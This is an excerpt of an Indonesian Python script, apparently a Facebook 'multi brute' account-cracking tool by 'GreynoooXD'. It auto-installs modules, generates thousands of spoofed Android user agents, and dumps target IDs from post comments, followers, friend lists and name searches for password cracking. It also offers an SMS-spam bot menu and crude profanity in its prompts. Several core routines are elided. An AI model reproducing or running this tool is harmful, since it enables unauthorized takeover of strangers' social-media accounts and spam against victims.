...
try:
        ...
        cetak(nel('\t• Sedang Memasang Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Memasang Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Memasang Modul Requests •'))
...
console = Console()
sys.stdout.write('\x1b]2; BMBF | GreynoooXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
...
for xd in range(10000):
	...
	uaku=f'Mozilla/5.0 (Linux; Android {a}; 10; K) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)
...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; M2006C3MG Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; Infinix X689D Build/RP1A.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
	brayen3=f'Mozilla/5.0 (Linux; Android {a}; CPH2471 Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	brayen4=f'Mozilla/5.0 (Linux; Android {a}; SM-A136W Build/TP1A.{b}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
...
def banner():
 ...
 | |_ / /_\ \ /  \/| |__ | |_/ /| | | || | | | |/ /     |  |   Author Script GreynoooXD
 |  _||  _  | |    |  __|| ___ \| | | || | | |    \     |  |   Update By GreynoooXD 
 | |  | | | | \__/\| |___| |_/ /\ \_/ /\ \_/ / |\  \    |  |   Version Script : New
...
def menu(my_name,my_id):
	...
	_____greynooo___xd____ = input(f' ╰─  Pilih Menu Crack : ')
	if _____greynooo___xd____ in ['1','01']:
		greyno_dump()
	elif _____greynooo___xd____ in ['2','02']:
		dump_massal()
	elif _____greynooo___xd____ in ['3','03']:
		result()
	elif _____greynooo___xd____ in ['lainnya','Lainnya','LAINNYA']:
		lainnya()
	elif _____greynooo___xd____ in ['Bot','BOT','bot']:
		bot()
	elif _____greynooo___xd____ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' ╰─  {m}Sukses Keluar+Hapus Cookies{x}')
		exit()
	else:
		print(' ╰─  Pilih Yang Bener Kontol ')
		back()
def error():
	print(f' ╰─  Maaf Fitur Dalam Perbaikan')
	time.sleep(4)
	back() 
###----------[ CRACK DARI KOMEN ]---------- ###
def komen():
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Bukan Private",width=90,padding=(0,4),style=f"bold white"))
	ide = input(f' ╰─  Masukan Id Post : ')
	url = 'https://mbasic.facebook.com/'+ide
	try:get_komen(url)
	except KeyboardInterrupt:setting()
	if len(dump)==0:
		print(f" ╰─  Gagal Dump Id, mungkinan Akun Private")
		time.sleep(3);exit()
	setting()
...
def pengikut():
	...
	try:
		...
		print(f" ╰─  Jaringan Anda Bermasalah")
		time.sleep(3);exit()
...
def bot():
	...
	if bray in(''):
		print(' ╰─  Pilih Yang Bener Kontol ');back()
	if bray in('1','01'):
		file_cp()
	elif bray in('2','02'):
		spam_sms()
...
def crack_nama():
	...
	nam = console.input(f' ╰─  Masukkan Nama : ').split(",")
	for ser in nam:		
...
def brayen_dump():
	...
	try:
		...
		print(' ╰─  Jaringan Lu Jelek Kontol')
		exit()
	except (KeyError,IOError):
		print(' ╰─  Pertemanan Tidak Publik Atau Cookie And Token Busuk')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
...
def setting():
	print('')
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Idz Tua [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz Mudah [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Idz Acak [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
